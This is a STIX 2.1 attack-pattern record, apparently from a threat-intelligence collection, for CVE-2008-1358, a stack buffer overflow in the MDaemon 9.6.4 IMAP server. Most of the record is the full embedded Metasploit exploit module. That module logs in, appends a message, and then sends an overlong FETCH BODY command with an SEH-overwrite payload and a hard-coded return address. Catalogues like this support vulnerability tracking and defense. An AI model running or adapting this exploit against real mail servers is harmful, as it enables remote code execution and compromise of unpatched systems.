{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f0390fd2-f4fc-4ecc-9543-e9803560d363",
    "created": "2024-08-14T16:47:44.257666Z",
    "modified": "2024-08-14T16:47:44.25767Z",
    "name": "MDaemon 9.6.4 IMAPD FETCH Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Alt-N MDaemon IMAP Server version 9.6.4 by sending an overly long FETCH BODY command. Valid IMAP account credentials are required. Credit to Matteo Memelli ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mdaemon_fetch.rb",
            "external_id": "mdaemon_fetch.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1358"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Imap\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MDaemon 9.6.4 IMAPD FETCH Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Alt-N MDaemon IMAP Server\n        version 9.6.4 by sending an overly long FETCH BODY command. Valid IMAP\n        account credentials are required. Credit to Matteo Memelli\n      },\n      'Author'         => [ 'Jacopo Cervini', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-1358' ],\n          [ 'OSVDB', '43111' ],\n          [ 'BID', '28245' ],\n          [ 'EDB', '5248' ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x0a])\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'MDaemon Version 9.6.4', { 'Ret' => 0x64dc118b } ], # p/p/r HashCash.dll\n        ],\n      'DisclosureDate' => '2008-03-13',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner and banner =~ /IMAP4rev1 MDaemon 9\\.6\\.4 ready/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_login\n\n    req0=\"0002 SELECT Inbox\\r\\n\"\n\n    res = raw_send_recv(req0)\n    if (res and res =~ /0002 OK/)\n      print_status(\"SELECT command OK\")\n    end\n\n    req1=\"0003 APPEND Inbox {1}\\r\\n\"\n\n    res = raw_send_recv(req1)\n    if (res and res =~ /Ready for append literal/)\n      print_status(\"APPEND command OK\")\n    end\n\n    res = raw_send_recv(rand_text_alpha(20) + \"\\r\\n\")\n    if (res and res =~ /APPEND completed/)\n      print_status(\"APPEND command finished\")\n    end\n\n    buf = rand_text_alpha_upper(528, payload_badchars)\n    buf << generate_seh_payload(target.ret) + rand_text_alpha_upper(35, payload_badchars)\n\n    sploit = \"A654 FETCH 2:4 (FLAGS BODY[\" + buf + \"(DATE FROM)])\\r\\n\"\n\n    print_status(\"Sending payload\")\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-03-13",
    "x_mitre_platforms": [
        "win'"
    ]
}